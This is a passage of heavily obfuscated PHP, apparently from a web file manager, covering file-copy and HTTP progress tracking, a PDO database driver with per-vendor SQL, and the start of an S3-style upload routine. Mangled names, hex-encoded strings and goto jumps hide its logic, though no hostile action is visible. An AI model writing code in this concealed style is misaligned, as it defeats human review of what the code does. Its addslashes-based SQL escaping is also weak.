$¯úàÂëÈ[$³†ì×½’[1974]] = 0; $¯úàÂëÈ[$³†ì×½’[1175]] = $³†ì×½’[12]; $¯úàÂëÈ[$³†ì×½’[1975]] = $³†ì×½’[12]; $¯úàÂëÈ[$³†ì×½’[1976]] = 0; $ãÆµâÒ = $¯úàÂëÈ[$³†ì×½’[1973]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¯úàÂëÈ[$³†ì×½’[492]] . $³†ì×½’[1994]); if ($ãÆµâÒ && file_exists(get_path_father($Ó¶í¼µ))) { Cache::set($¯úàÂëÈ[$³†ì×½’[492]] . $³†ì×½’[1994], $Ó¶í¼µ); $¯úàÂëÈ[$³†ì×½’[1944]] = array($³†ì×½’[1995], $³†ì×½’[1996]); } $this->update(0, $ãÆµâÒ); self::log("\143\157\x70\x79\x46\x69\154\x65\123\x74\x61\x72\x74\x3a{$óòí»‚º}\73"); } public static function updateCopyLocalFileSize($™ÖôšùÏ) { $———å†„ =& $_SERVER[ŒÅŸ‹ä†]; $Æåà‚Ì = Cache::get($™ÖôšùÏ[$———å†„[492]] . $———å†„[1994]); if (!$Æåà‚Ì || !file_exists($Æåà‚Ì)) { return $™ÖôšùÏ; } $™ÖôšùÏ[$———å†„[1974]] = @filesize($Æåà‚Ì); $™ÖôšùÏ[$———å†„[1978]] += $™ÖôšùÏ[$———å†„[1974]]; self::updateTask($™ÖôšùÏ); return $™ÖôšùÏ; } public function copyFileEnd($…¤Ô¼º®, $²À‚Ö¸È, $ŞæÑŒ§ï, $éÆ›Øğé, $Í‹‘Æ€¼, $¿Ö×¤×É) { $Î˜¾ˆ˜« =& $_SERVER[ŒÅŸ‹ä†]; $—” ŠÂÀ =& $this->task; $—” ŠÂÀ[$Î˜¾ˆ˜«[1974]] = $—” ŠÂÀ[$Î˜¾ˆ˜«[1973]]; $—” ŠÂÀ[$Î˜¾ˆ˜«[1975]] = $Î˜¾ˆ˜«[12]; unset($—” ŠÂÀ[$Î˜¾ˆ˜«[1944]]); if ($Í‹‘Æ€¼ == $—” ŠÂÀ[$Î˜¾ˆ˜«[1971]]) { $—” ŠÂÀ[$Î˜¾ˆ˜«[1977]] += $—” ŠÂÀ[$Î˜¾ˆ˜«[1973]]; $—” ŠÂÀ[$Î˜¾ˆ˜«[1978]] = $—” ŠÂÀ[$Î˜¾ˆ˜«[1977]]; $÷ĞÏÏËË = 1; if (isset($—” ŠÂÀ[$Î˜¾ˆ˜«[1987]]) && $—” ŠÂÀ[$Î˜¾ˆ˜«[1987]] == $²À‚Ö¸È) { $÷ĞÏÏËË = 0; } $this->update($÷ĞÏÏËË); } else { $this->update(); $—” ŠÂÀ[$Î˜¾ˆ˜«[1974]] = 0; } Cache::remove($—” ŠÂÀ[$Î˜¾ˆ˜«[492]] . $Î˜¾ˆ˜«[1994]); self::log($Î˜¾ˆ˜«[1997] . $²À‚Ö¸È . $Î˜¾ˆ˜«[83] . $éÆ›Øğé . $Î˜¾ˆ˜«[18] . $Í‹‘Æ€¼ . $Î˜¾ˆ˜«[1998] . $—” ŠÂÀ[$Î˜¾ˆ˜«[1971]]); } public function updateFileEnd($…ñ•ÀÆ, $¥ÖĞË²) { $ıËƒßØË =& $_SERVER[ŒÅŸ‹ä†]; $ş¼êªç’ =& $this->task; $ş¼êªç’[$ıËƒßØË[1971]] = $…ñ•ÀÆ; $ş¼êªç’[$ıËƒßØË[1973]] = $¥ÖĞË²; $ş¼êªç’[$ıËƒßØË[1977]] += $¥ÖĞË²; $ş¼êªç’[$ıËƒßØË[1978]] = $ş¼êªç’[$ıËƒßØË[1977]]; $this->update(1); self::log($ıËƒßØË[1999] . $…ñ•ÀÆ); } public function sourceModelCopy($ĞÀİ¥ê†) { $¤Üñü­ñ =& $_SERVER[ŒÅŸ‹ä†]; $ú‘ä¿“ = $ĞÀİ¥ê†[0]; $Ÿ¸³ùÈõ = $ĞÀİ¥ê†[1]; $õï³¬² =& $this->task; $this->sourceModelCopyFlag = !0; $¨ÃñÌê€ = 0; switch ($ú‘ä¿“) { case $¤Üñü­ñ[663]: $¨ÃñÌê€ = 1; break; case $¤Üñü­ñ[666]: $õï³¬²[$¤Üñü­ñ[1971]] = $Ÿ¸³ùÈõ[$¤Üñü­ñ[42]]; break; case $¤Üñü­ñ[668]: $¨ÃñÌê€ = intval($ĞÀİ¥ê†[$¤Üñü­ñ[476]] * 0.4); break; case $¤Üñü­ñ[670]: $¨ÃñÌê€ = intval($ĞÀİ¥ê†[$¤Üñü­ñ[476]] * 0.2); break; case $¤Üñü­ñ[672]: $¨ÃñÌê€ = intval($ĞÀİ¥ê†[$¤Üñü­ñ[476]] * 0.4); break; } $this->update($¨ÃñÌê€); self::log(array("{$ú‘ä¿“}\73\141\144\x64\75{$¨ÃñÌê€}", $ĞÀİ¥ê†)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($™ş¡Í¯†, $—ëµÊë) { $æÕëÌ×© =& $_SERVER[ŒÅŸ‹ä†]; $this->sourceModelCopyFlag = !0; $•÷ŒÅÎİ = 1; if (isset($™ş¡Í¯†[$æÕëÌ×©[92]])) { $•÷ŒÅÎİ = $™ş¡Í¯†[$æÕëÌ×©[92]][$æÕëÌ×©[90]]; $•÷ŒÅÎİ = $•÷ŒÅÎİ + $™ş¡Í¯†[$æÕëÌ×©[92]][$æÕëÌ×©[91]] + 1; } $this->update($•÷ŒÅÎİ); $this->sourceModelCopyFlag = !1; $this->log(array($æÕëÌ×©[2000], $•÷ŒÅÎİ, $™ş¡Í¯†)); } public function sourceMove($Ø¨µ¹ªï) { $this->sourceRemove($Ø¨µ¹ªï, !1); } public function curlProgress($˜åÃªß, $”¹·’é, $€ìã‰¥, $Ê§ó¾èè, $ğ·ûËŠõ) { $ÑÃ¿Û’µ =& $_SERVER[ŒÅŸ‹ä†]; $Ê‚¥É²ü =& $this->task; if ($ğ·ûËŠõ > 0) { $Ê‚¥É²ü[$ÑÃ¿Û’µ[1175]] = $ÑÃ¿Û’µ[2001]; $Ê‚¥É²ü[$ÑÃ¿Û’µ[1975]] = $ÑÃ¿Û’µ[118]; if ($Ê‚¥É²ü[$ÑÃ¿Û’µ[1973]]) { $Ê‚¥É²ü[$ÑÃ¿Û’µ[1974]] = $ğ·ûËŠõ; } if ($Ê‚¥É²ü[$ÑÃ¿Û’µ[1976]]) { $Ê‚¥É²ü[$ÑÃ¿Û’µ[1974]] = $ğ·ûËŠõ + $Ê‚¥É²ü[$ÑÃ¿Û’µ[1976]]; } } else { if ($€ìã‰¥ > 0) { if ($Ê‚¥É²ü[$ÑÃ¿Û’µ[1973]] == $”¹·’é) { $Ê‚¥É²ü[$ÑÃ¿Û’µ[1974]] = $€ìã‰¥; $Ê‚¥É²ü[$ÑÃ¿Û’µ[1175]] = $ÑÃ¿Û’µ[2002]; $Ê‚¥É²ü[$ÑÃ¿Û’µ[1975]] = $ÑÃ¿Û’µ[1326]; } } } $this->update(); $µóÎÀÈó = "\144\157\167\x6e\72{$€ìã‰¥}\57{$”¹·’é}\73\x20\165\160\154\157\141\x64\x3a{$ğ·ûËŠõ}\x2f{$Ê§ó¾èè}\73\x66\x69\154\145\x3d" . $Ê‚¥É²ü[$ÑÃ¿Û’µ[1973]]; self::log(array($ÑÃ¿Û’µ[2003] . $µóÎÀÈó . $ÑÃ¿Û’µ[84] . $Ê‚¥É²ü[$ÑÃ¿Û’µ[1971]], curl_getinfo($˜åÃªß))); } public function curlProgressStart($“ŞùÜƒ) { } public function curlProgressEnd($Ÿç‚ğ‰À) { $ì©ËÏŸÄ =& $_SERVER[ŒÅŸ‹ä†]; $Ä‰™¦®Í =& $this->task; $‡›£ºÑ‰ = curl_getinfo($Ÿç‚ğ‰À); $ø¤ã¶Æ‡ = $‡›£ºÑ‰[$ì©ËÏŸÄ[2004]]; if ($ø¤ã¶Æ‡ == -1) { $ø¤ã¶Æ‡ = $‡›£ºÑ‰[$ì©ËÏŸÄ[2005]]; } if ($Ä‰™¦®Í[$ì©ËÏŸÄ[1975]] == $ì©ËÏŸÄ[118] && $ø¤ã¶Æ‡) { $Ä‰™¦®Í[$ì©ËÏŸÄ[1976]] += $ø¤ã¶Æ‡; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $•¤ÁÁ•¼ =& $_SERVER[ŒÅŸ‹ä†]; $¿¨øÓû =& $this->task; $¿¨øÓû[$•¤ÁÁ•¼[2006]] = 1; Hook::bind($•¤ÁÁ•¼[1965], array($this, $•¤ÁÁ•¼[2007])); Hook::bind($•¤ÁÁ•¼[1967], array($this, $•¤ÁÁ•¼[2008])); Hook::bind($•¤ÁÁ•¼[1969], array($this, $•¤ÁÁ•¼[2009])); } protected function endAfter() { $ÜçÛó£Œ =& $_SERVER[ŒÅŸ‹ä†]; Hook::unbind($ÜçÛó£Œ[1965], array($this, $ÜçÛó£Œ[2007])); Hook::unbind($ÜçÛó£Œ[1967], array($this, $ÜçÛó£Œ[2008])); Hook::unbind($ÜçÛó£Œ[1969], array($this, $ÜçÛó£Œ[2009])); } public function progressStart($šËÂÀÑ¦) { $ÕË†¯ù™ =& $_SERVER[ŒÅŸ‹ä†]; $¦â¦Ÿş¨ = curl_getinfo($šËÂÀÑ¦); self::log($ÕË†¯ù™[2010] . $¦â¦Ÿş¨[$ÕË†¯ù™[392]]); self::valueSet($this->task[$ÕË†¯ù™[492]], $this->task); } public function progressEnd($è£¼ı«³) { $‹–´»˜´ =& $_SERVER[ŒÅŸ‹ä†]; self::log($‹–´»˜´[2011] . $this->task[$‹–´»˜´[492]]); $this->end(); } public function progress($Ã·å¬ªå, $‡Òåß¯­, $ªÉãÂåŞ, $îƒšÛ³š, $Ö–ÄÍ†Õ) { $·¯ª•”‚ =& $_SERVER[ŒÅŸ‹ä†]; $ø…›áü =& $this->task; if ($Ö–ÄÍ†Õ > 0) { $ø…›áü[$·¯ª•”‚[1173]] = $ø…›áü[$·¯ª•”‚[1173]] == 0 ? $îƒšÛ³š : $ø…›áü[$·¯ª•”‚[1173]]; $ø…›áü[$·¯ª•”‚[1920]] = $Ö–ÄÍ†Õ; } else { if ($ªÉãÂåŞ > 0) { $ø…›áü[$·¯ª•”‚[1173]] = $ø…›áü[$·¯ª•”‚[1173]] == 0 ? $‡Òåß¯­ : $ø…›áü[$·¯ª•”‚[1173]]; $ø…›áü[$·¯ª•”‚[1920]] = $ªÉãÂåŞ; } } $this->update(); self::log("\160\162\x6f\147\162\x65\x73\163\110\x74\x74\160\x3a\144\157\167\x6e\x3a{$ªÉãÂåŞ}\x2f{$‡Òåß¯­}\x3b\x20\165\x70\x6c\x6f\x61\x64\x3a{$Ö–ÄÍ†Õ}\57{$îƒšÛ³š}\x3b"); } } goto aˆ’Š¿–õ°; DÀŒÎä–Ÿñ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ü©¦³¿» = '') { $á®ì– =& $_SERVER[ŒÅŸ‹ä†]; if (!class_exists($á®ì–[1025])) { think_exception(think_lang($á®ì–[24]) . $á®ì–[1026]); } if (!empty($ü©¦³¿»)) { $this->config = $ü©¦³¿»; if (empty($this->config[$á®ì–[27]])) { $this->config[$á®ì–[27]] = array(); } } } public function connect($íõ›î„œ = '', $ß¿ââ• = 0) { $ØÜŒ–âã =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($this->linkID[$ß¿ââ•])) { if (empty($íõ›î„œ)) { $íõ›î„œ = $this->config; } $ÃŸ×—ô = !empty($íõ›î„œ[$ØÜŒ–âã[27]][$ØÜŒ–âã[28]]) ? $íõ›î„œ[$ØÜŒ–âã[27]][$ØÜŒ–âã[28]] : $this->pconnect; if ($ÃŸ×—ô) { $íõ›î„œ[$ØÜŒ–âã[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ß¿ââ•] = new PDO($íõ›î„œ[$ØÜŒ–âã[1027]], $íõ›î„œ[$ØÜŒ–âã[996]], $íõ›î„œ[$ØÜŒ–âã[997]], $íõ›î„œ[$ØÜŒ–âã[27]]); } catch (PDOException $ı„ÉŸ–ì) { think_exception($ı„ÉŸ–ì->getMessage()); } $this->dbType = $this->_getDsnType($íõ›î„œ[$ØÜŒ–âã[1027]]); if (in_array($this->dbType, array($ØÜŒ–âã[1028], $ØÜŒ–âã[1029], $ØÜŒ–âã[1030], $ØÜŒ–âã[1031]))) { think_exception($ØÜŒ–âã[1032] . $this->dbType . $ØÜŒ–âã[1033] . $this->dbType . $ØÜŒ–âã[1034]); } if (!$this->linkID[$ß¿ââ•]) { think_exception($ØÜŒ–âã[1035]); } try { $this->linkID[$ß¿ââ•]->exec($ØÜŒ–âã[1036] . think_config($ØÜŒ–âã[999])); } catch (Exception $ı„ÉŸ–ì) { } $this->connected = !0; if (1 != think_config($ØÜŒ–âã[32])) { unset($this->config); } } return $this->linkID[$ß¿ââ•]; } public function free() { $this->PDOStatement = null; } public function query($Û·Ôİï‰, $ñôëğ¸ã = array()) { $û‹±“Ä =& $_SERVER[ŒÅŸ‹ä†]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Û·Ôİï‰; if (!empty($ñôëğ¸ã)) { $this->queryStr .= $û‹±“Ä[1037] . print_r($ñôëğ¸ã, !0) . $û‹±“Ä[1038]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($û‹±“Ä[33], 1); think_status($û‹±“Ä[34]); $this->PDOStatement = $this->_linkID->prepare($Û·Ôİï‰); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $äø¸Ñ»© = $this->PDOStatement->execute($ñôëğ¸ã); $this->debug(); if (!1 === $äø¸Ñ»©) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($‡å”á÷ç, $ÁÏ½â§ = array()) { $×ó‚Êúñ =& $_SERVER[ŒÅŸ‹ä†]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‡å”á÷ç; if (!empty($ÁÏ½â§)) { $this->queryStr .= $×ó‚Êúñ[1037] . print_r($ÁÏ½â§, !0) . $×ó‚Êúñ[1038]; } $Ë»Êï€ã = !1; if ($this->dbType == $×ó‚Êúñ[1031]) { if (preg_match($×ó‚Êúñ[1039], $this->queryStr, $­Ä ï†š)) { $this->table = think_config($×ó‚Êúñ[1040]) . str_ireplace(think_config($×ó‚Êúñ[1041]), $×ó‚Êúñ[472], $­Ä ï†š[2]); $Ë»Êï€ã = (bool) $this->query($×ó‚Êúñ[1042] . strtoupper($this->table) . $×ó‚Êúñ[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($×ó‚Êúñ[35], 1); think_status($×ó‚Êúñ[34]); $this->PDOStatement = $this->_linkID->prepare($‡å”á÷ç); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ì²É’è = $this->PDOStatement->execute($ÁÏ½â§); $this->debug(); if (!1 === $ì²É’è) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Ë»Êï€ã || preg_match($×ó‚Êúñ[1043], $‡å”á÷ç)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $óÁğ¿¢• = $this->_linkID->commit(); $this->transTimes = 0; if (!$óÁğ¿¢•) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $åòÁ¾¼ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$åòÁ¾¼) { $this->error(); return !1; } } return !0; } private function getAll() { $Ûú¢øü› = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ûú¢øü›); return $Ûú¢øü›; } public function getFields($¹–«“Àé) { $õ×‹£“§ =& $_SERVER[ŒÅŸ‹ä†]; $this->initConnect(!0); if (think_config($õ×‹£“§[1044])) { $ÚäÕòß© = str_replace($õ×‹£“§[1045], $¹–«“Àé, think_config($õ×‹£“§[1044])); } else { switch ($this->dbType) { case $õ×‹£“§[1028]: case $õ×‹£“§[1046]: $ÚäÕòß© = "\x53\x45\114\105\103\x54\x20\x20\40\143\x6f\154\x75\155\x6e\x5f\x6e\141\x6d\145\40\141\163\x20\x27\x4e\141\155\x65\47\54\40\40\x20\x64\141\164\141\137\164\x79\x70\x65\x20\141\163\40\47\x54\x79\x70\145\47\x2c\40\40\x20\x63\x6f\154\165\155\156\137\x64\x65\146\141\x75\x6c\x74\x20\x61\x73\40\47\x44\x65\146\141\165\x6c\164\47\54\40\40\40\151\163\137\156\165\x6c\x6c\141\142\x6c\145\x20\141\x73\40\47\116\x75\154\154\x27\12\11\11\106\x52\x4f\x4d\x9\151\x6e\146\157\x72\x6d\141\x74\151\x6f\156\137\x73\143\150\x65\155\141\56\x74\141\142\x6c\x65\x73\40\101\123\40\x74\xa\x9\11\x4a\x4f\111\116\11\x69\156\146\x6f\162\x6d\x61\164\x69\157\156\137\163\143\x68\x65\155\141\56\143\x6f\x6c\165\155\156\163\x20\x41\123\x20\x63\xa\11\x9\x4f\x4e\x20\x20\x74\x2e\x74\141\x62\x6c\145\x5f\143\141\164\141\x6c\157\x67\x20\75\x20\143\56\x74\141\x62\x6c\x65\x5f\x63\141\x74\x61\154\x6f\147\xa\11\11\x41\116\x44\x20\x74\x2e\164\141\142\154\x65\137\x73\143\x68\145\x6d\x61\x20\75\x20\143\56\164\141\x62\154\x65\x5f\x73\143\x68\145\x6d\x61\xa\11\x9\x41\x4e\104\x20\164\56\x74\x61\142\154\145\x5f\x6e\141\155\x65\40\x3d\x20\143\56\x74\x61\142\x6c\145\x5f\156\x61\155\x65\xa\11\x9\127\110\x45\122\x45\x20\40\x20\164\x2e\x74\141\x62\154\145\x5f\x6e\x61\155\x65\40\75\x20\x27{$¹–«“Àé}\x27"; break; case $õ×‹£“§[1047]: $ÚäÕòß© = $õ×‹£“§[1048] . $¹–«“Àé . $õ×‹£“§[1049]; break; case $õ×‹£“§[1029]: case $õ×‹£“§[1031]: $ÚäÕòß© = $õ×‹£“§[1050] . $õ×‹£“§[1051] . $õ×‹£“§[1052] . strtoupper($¹–«“Àé) . $õ×‹£“§[1053] . strtoupper($¹–«“Àé) . $õ×‹£“§[1054]; break; case $õ×‹£“§[1055]: $ÚäÕòß© = $õ×‹£“§[1056] . $¹–«“Àé . $õ×‹£“§[1057]; break; case $õ×‹£“§[1030]: break; case $õ×‹£“§[1058]: default: $ÚäÕòß© = $õ×‹£“§[1059] . ($this->dbType == $õ×‹£“§[1058] ? "\x60{$¹–«“Àé}\140" : $¹–«“Àé); } } $İÊûÚ¼ö = $this->query($ÚäÕòß©); $ªĞ¡ÏÒ = array(); if ($İÊûÚ¼ö) { foreach ($İÊûÚ¼ö as $·«ßê£ => $¹êû•ôë) { $¹êû•ôë = array_change_key_case($¹êû•ôë); $¹êû•ôë[$õ×‹£“§[42]] = isset($¹êû•ôë[$õ×‹£“§[42]]) ? $¹êû•ôë[$õ×‹£“§[42]] : $õ×‹£“§[472]; $¹êû•ôë[$õ×‹£“§[43]] = isset($¹êû•ôë[$õ×‹£“§[43]]) ? $¹êû•ôë[$õ×‹£“§[43]] : $õ×‹£“§[472]; $Ä…Û™’¨ = isset($¹êû•ôë[$õ×‹£“§[361]]) ? $¹êû•ôë[$õ×‹£“§[361]] : $¹êû•ôë[$õ×‹£“§[42]]; $ªĞ¡ÏÒ[$Ä…Û™’¨] = array($õ×‹£“§[42] => $Ä…Û™’¨, $õ×‹£“§[43] => $¹êû•ôë[$õ×‹£“§[43]], $õ×‹£“§[45] => (bool) (isset($¹êû•ôë[$õ×‹£“§[114]]) && $¹êû•ôë[$õ×‹£“§[114]] === $õ×‹£“§[12] || isset($¹êû•ôë[$õ×‹£“§[45]]) && $¹êû•ôë[$õ×‹£“§[45]] === $õ×‹£“§[12]), $õ×‹£“§[47] => isset($¹êû•ôë[$õ×‹£“§[47]]) ? $¹êû•ôë[$õ×‹£“§[47]] : (isset($¹êû•ôë[$õ×‹£“§[66]]) ? $¹êû•ôë[$õ×‹£“§[66]] : $õ×‹£“§[472]), $õ×‹£“§[49] => isset($¹êû•ôë[$õ×‹£“§[105]]) ? strtolower($¹êû•ôë[$õ×‹£“§[105]]) == $õ×‹£“§[51] : (isset($¹êû•ôë[$õ×‹£“§[67]]) ? $¹êû•ôë[$õ×‹£“§[67]] : !1), $õ×‹£“§[52] => isset($¹êû•ôë[$õ×‹£“§[1060]]) ? strtolower($¹êû•ôë[$õ×‹£“§[1060]]) == $õ×‹£“§[54] : (isset($¹êû•ôë[$õ×‹£“§[105]]) ? $¹êû•ôë[$õ×‹£“§[105]] : !1)); } } return $ªĞ¡ÏÒ; } public function getTables($ïÂğ˜Şò = '') { $Òê§äÓÑ =& $_SERVER[ŒÅŸ‹ä†]; if (think_config($Òê§äÓÑ[1061])) { $Ôò˜Å÷¸ = str_replace($Òê§äÓÑ[1062], $ïÂğ˜Şò, think_config($Òê§äÓÑ[1061])); } else { switch ($this->dbType) { case $Òê§äÓÑ[1029]: case $Òê§äÓÑ[1031]: $Ôò˜Å÷¸ = $Òê§äÓÑ[1063]; break; case $Òê§äÓÑ[1028]: case $Òê§äÓÑ[1046]: $Ôò˜Å÷¸ = $Òê§äÓÑ[1064]; break; case $Òê§äÓÑ[1055]: $Ôò˜Å÷¸ = $Òê§äÓÑ[1065]; break; case $Òê§äÓÑ[1030]: think_exception(think_lang($Òê§äÓÑ[1066]) . $Òê§äÓÑ[1067]); break; case $Òê§äÓÑ[1047]: $Ôò˜Å÷¸ = $Òê§äÓÑ[55] . $Òê§äÓÑ[56] . $Òê§äÓÑ[57]; break; case $Òê§äÓÑ[1058]: default: if (!empty($ïÂğ˜Şò)) { $Ôò˜Å÷¸ = $Òê§äÓÑ[1007] . $ïÂğ˜Şò . $Òê§äÓÑ[1008]; } else { $Ôò˜Å÷¸ = $Òê§äÓÑ[1009]; } } } $Î½Å œá = $this->query($Ôò˜Å÷¸); $Øó£’­” = array(); foreach ($Î½Å œá as $àıùÈËœ => $ê–´±Èš) { $Øó£’­”[$àıùÈËœ] = current($ê–´±Èš); } return $Øó£’­”; } protected function parseLimit($¸ÔÓˆï) { $şÆÙå¿ƒ =& $_SERVER[ŒÅŸ‹ä†]; $ã—•ïµ = $şÆÙå¿ƒ[12]; if (!empty($¸ÔÓˆï)) { switch ($this->dbType) { case $şÆÙå¿ƒ[1055]: case $şÆÙå¿ƒ[1047]: $¸ÔÓˆï = explode($şÆÙå¿ƒ[60], $¸ÔÓˆï); if (count($¸ÔÓˆï) > 1) { $ã—•ïµ .= $şÆÙå¿ƒ[61] . $¸ÔÓˆï[1] . $şÆÙå¿ƒ[62] . $¸ÔÓˆï[0] . $şÆÙå¿ƒ[63]; } else { $ã—•ïµ .= $şÆÙå¿ƒ[61] . $¸ÔÓˆï[0] . $şÆÙå¿ƒ[63]; } break; case $şÆÙå¿ƒ[1028]: case $şÆÙå¿ƒ[1046]: break; case $şÆÙå¿ƒ[1030]: break; case $şÆÙå¿ƒ[1029]: case $şÆÙå¿ƒ[1031]: break; case $şÆÙå¿ƒ[1058]: default: $ã—•ïµ .= $şÆÙå¿ƒ[61] . $¸ÔÓˆï . $şÆÙå¿ƒ[63]; } } return $ã—•ïµ; } public function parseKey(&$‡¥ü¿²ä, $Š“Ë¿‹Î = true) { $¸°ë‡‚á =& $_SERVER[ŒÅŸ‹ä†]; if ($Š“Ë¿‹Î) { $‡¥ü¿²ä = $this->parseKeyCheck($‡¥ü¿²ä); } if ($this->dbType == $¸°ë‡‚á[1058]) { if ($‡¥ü¿²ä != $¸°ë‡‚á[231] && !preg_match($¸°ë‡‚á[1022], $‡¥ü¿²ä)) { $‡¥ü¿²ä = $¸°ë‡‚á[481] . trim($‡¥ü¿²ä, $¸°ë‡‚á[481]) . $¸°ë‡‚á[481]; } return $‡¥ü¿²ä; } else { return parent::parseKey($‡¥ü¿²ä, $Š“Ë¿‹Î); } } public function close() { $this->_linkID = null; } public function error() { $—°¹ö‚Ş =& $_SERVER[ŒÅŸ‹ä†]; if ($this->PDOStatement) { $§Î™áñ­ = $this->PDOStatement->errorInfo(); $this->error = $§Î™áñ­[1] . $—°¹ö‚Ş[4] . $§Î™áñ­[2]; } else { $this->error = $—°¹ö‚Ş[12]; } if ($—°¹ö‚Ş[12] != $this->queryStr) { $this->error .= LNG($—°¹ö‚Ş[58]) . $this->queryStr; } think_trace($this->error, $—°¹ö‚Ş[12], $—°¹ö‚Ş[59]); return $this->error; } public function escapeString($³‰¨ü¿‡) { $óÜ­Óå =& $_SERVER[ŒÅŸ‹ä†]; switch ($this->dbType) { case $óÜ­Óå[1055]: case $óÜ­Óå[1028]: case $óÜ­Óå[1046]: case $óÜ­Óå[1058]: return addslashes($³‰¨ü¿‡); case $óÜ­Óå[1030]: case $óÜ­Óå[1047]: case $óÜ­Óå[1029]: case $óÜ­Óå[1031]: return str_ireplace($óÜ­Óå[68], $óÜ­Óå[69], $³‰¨ü¿‡); } } protected function parseValue($ÇÉìŠ€Ä) { $½ÖÎ…Ø” =& $_SERVER[ŒÅŸ‹ä†]; if (is_string($ÇÉìŠ€Ä)) { $³´ªÍ·í = strpos($ÇÉìŠ€Ä, $½ÖÎ…Ø”[4]) === 0 && in_array($ÇÉìŠ€Ä, array_keys($this->bind)); $ÇÉìŠ€Ä = $³´ªÍ·í ? $this->escapeString($ÇÉìŠ€Ä) : $½ÖÎ…Ø”[1068] . $this->escapeString($ÇÉìŠ€Ä) . $½ÖÎ…Ø”[1068]; } elseif (isset($ÇÉìŠ€Ä[0]) && is_string($ÇÉìŠ€Ä[0]) && strtolower($ÇÉìŠ€Ä[0]) == $½ÖÎ…Ø”[382]) { $ÇÉìŠ€Ä = $this->escapeString($ÇÉìŠ€Ä[1]); } elseif (is_array($ÇÉìŠ€Ä)) { $ÇÉìŠ€Ä = array_map(array($this, $½ÖÎ…Ø”[1069]), $ÇÉìŠ€Ä); } elseif (is_bool($ÇÉìŠ€Ä)) { $ÇÉìŠ€Ä = $ÇÉìŠ€Ä ? $½ÖÎ…Ø”[101] : $½ÖÎ…Ø”[239]; } elseif (is_null($ÇÉìŠ€Ä)) { $ÇÉìŠ€Ä = $½ÖÎ…Ø”[114]; } return $ÇÉìŠ€Ä; } public function getLastInsertId() { $ÚÖ¯ÓÄ =& $_SERVER[ŒÅŸ‹ä†]; switch ($this->dbType) { case $ÚÖ¯ÓÄ[1055]: case $ÚÖ¯ÓÄ[1047]: case $ÚÖ¯ÓÄ[1028]: case $ÚÖ¯ÓÄ[1046]: case $ÚÖ¯ÓÄ[1030]: case $ÚÖ¯ÓÄ[1058]: return $this->_linkID->lastInsertId(); case $ÚÖ¯ÓÄ[1029]: case $ÚÖ¯ÓÄ[1031]: $Ò¯ğİÇ· = $this->table; $ä±ø¶ò = $this->query("\x53\105\x4c\x45\x43\124\40{$Ò¯ğİÇ·}\x2e\x63\x75\162\x72\166\141\x6c\x20\x63\165\162\162\166\141\154\x20\106\122\x4f\115\40\144\165\x61\x6c"); return $ä±ø¶ò ? $ä±ø¶ò[0][$ÚÖ¯ÓÄ[1070]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($å‹Š£‘) { $öÛÙŠì€ =& $_SERVER[ŒÅŸ‹ä†]; if (!CacheLock::fileLock($öÛÙŠì€[23])) { return !1; } $ä„Õœïô = parent::query($å‹Š£‘); CacheLock::fileUnLock($öÛÙŠì€[23]); return $ä„Õœïô; } public function execute($¡Î½ËÛ) { $›¾×¶àÒ =& $_SERVER[ŒÅŸ‹ä†]; if (!CacheLock::fileLock($›¾×¶àÒ[23])) { return !1; } $‰µæ÷«Í = parent::execute($¡Î½ËÛ); CacheLock::fileUnLock($›¾×¶àÒ[23]); return $‰µæ÷«Í; } } class DbSqlite3 extends DbSqlite3Base { public function query($ŠÎ‘¢ù) { $Õ¢„åÂ =& $_SERVER[ŒÅŸ‹ä†]; if (!CacheLock::fileLock($Õ¢„åÂ[23])) { return !1; } $º”É»Ê¾ = parent::query($ŠÎ‘¢ù); CacheLock::fileUnLock($Õ¢„åÂ[23]); return $º”É»Ê¾; } public function execute($üÔ¸Í£é) { $¬’÷´±€ =& $_SERVER[ŒÅŸ‹ä†]; if (!CacheLock::fileLock($¬’÷´±€[23])) { return !1; } $’ìĞÔ­ = parent::execute($üÔ¸Í£é); CacheLock::fileUnLock($¬’÷´±€[23]); return $’ìĞÔ­; } } goto c²òÇ“¡š’; B±Ûé’³„œ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($·ë‰î®ğ) { parent::__construct($·ë‰î®ğ); $this->setSignVersion($_SERVER[ŒÅŸ‹ä†][258]); } public function uploadFormData($Ç­ØÒÄ™, $Šä•õã = 3600) { $‡ƒòæ€² =& $_SERVER[ŒÅŸ‹ä†]; $øˆ˜‚§É = $‡ƒòæ€²[240]; $ªŞ‡˜›ı = $‡ƒòæ€²[268]; $äÆóÃáÓ = $‡ƒòæ€²[72]; $•àÍù½‹ = gmdate($‡ƒòæ€²[269]); $¬î‡ß­ò = gmdate($‡ƒòæ€²[270]); $ŠÓ¬‘· = $‡ƒòæ€²[271]; $Ä¹±‚Îì = $Šä•õã . $‡ƒòæ€²[12]; $Á‹ò‰ó¹ = $‡ƒòæ€²[272]; $ì¿£« = array($this->accessKey, $¬î‡ß­ò, $this->region, $äÆóÃáÓ, $ŠÓ¬‘·); $çîº®Ö¤ = implode($‡ƒòæ€²[8], $ì¿£«); $¢²Ñ³É = array($‡ƒòæ€²[273] => gmdate($‡ƒòæ€²[1469], strtotime($‡ƒòæ€²[275])), $‡ƒòæ€²[276] => array(array($‡ƒòæ€²[277] => $this->bucket), array($‡ƒòæ€²[316] => 